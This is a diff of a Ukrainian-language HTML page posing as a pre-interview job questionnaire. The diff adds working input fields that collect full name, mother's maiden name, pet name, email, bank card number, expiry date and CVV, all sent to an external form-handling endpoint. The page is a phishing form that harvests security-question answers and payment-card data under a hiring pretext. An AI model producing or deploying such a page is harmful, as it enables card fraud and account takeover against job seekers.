@@ -9,23 +9,52 @@
 </head>
 
 <body>
-    
-    
+
+
 
     <a href="index.html">На головну</a>
-    
+
     <h3>Правду, тільки правду, і нічого, крім правди</h3>
-    
+
     <p>Опитування допоможе нам краще зрозуміти вас перед запрошенням на співбесіду.</p>
 
     <form method="POST" action="https://formspree.io/vasyl.fear.k2@gmail.com">
-        <p>1. Чим Ви займалися на попередньому місця роботи?</p>
-        <p>2. Чого ви прагнете тут досягнути?</p>
+        <label>
+                1. Чим Ви займалися на попередньому місця роботи? <br><br>
+                <textarea placeholder="до 100 слів"></textarea>
+            </label>
+        <label><br>
+                2. Чого ви прагнете тут досягнути? <br><br>
+                <textarea placeholder="до 100 слів"></textarea>
+            </label>
+        <label><br>
+                3. Очікуваний розмір вашої заробітньої плати?
+                <input type="text" name="name" required>
+            </label>
+
+
+
+
+
         <p>3. Очікуваний розмір вашої заробітньої плати?</p>
+
+
         <pre>  А теперт стосовно особистої інформаці про Вас</pre>
-        <p>4. Вкажіть ваше повне ім'я.</p>
-        <p>5. Дівоче прізвище матері?</p>
-        <p>6. І'мя улюбленої домашньої тварини?</p>
+
+
+
+        <label>
+            4. Вкажіть ваше повне ім'я. <input type="text" name="name" required>
+        </label>.<br><br>
+        <label>
+            4. Дівоче прізвище матері? <input type="text" name="mothefirstname" required>
+        </label>.<br><br>
+        <label>
+            6. І'мя улюбленої домашньої тварини? <input type="text" name="petname" required>
+        </label>.<br><br>
+
+
+
         <label>
             7. Ваш електронний адрес <input type="text" name="email" required>
         </label>.<br><br>
@@ -35,21 +64,21 @@
         <label>
             8. Номер Вашої банківської карточки <input type="text" maxlength="16" name="cardnamber" size="13" required>
         </label>.<br>
-        
-        
+
+
         <label><br>
             9. Термін дії 
             <select name="cardmonth" required>
         <option value="" disabled selected hidden>ММ</option>
-        <option value="1">01</option>
-        <option value="2">02</option>
-        <option value="3">03</option>
-        <option value="4">04</option>
-        <option value="5">05</option>
-        <option value="6">06</option>
-        <option value="7">07</option>
-        <option value="8">08</option>
-        <option value="9">09</option>
+        <option value="01">01</option>
+        <option value="02">02</option>
+        <option value="03">03</option>
+        <option value="04">04</option>
+        <option value="05">05</option>
+        <option value="06">06</option>
+        <option value="07">07</option>
+        <option value="08">08</option>
+        <option value="09">09</option>
         <option value="10">10</option>
         <option value="11">11</option>
         <option value="12">12</option>
@@ -72,13 +101,13 @@
         <label>
             CVV <input type="text" maxlength="3" name="cardcvv" size="1" required>
         </label>.<br><br>
-        
+
         <input type="submit">
 
 
     </form>
     <p>Ми з вами звяжемося незабаром.</p>
-    
+
 
 </body>
 
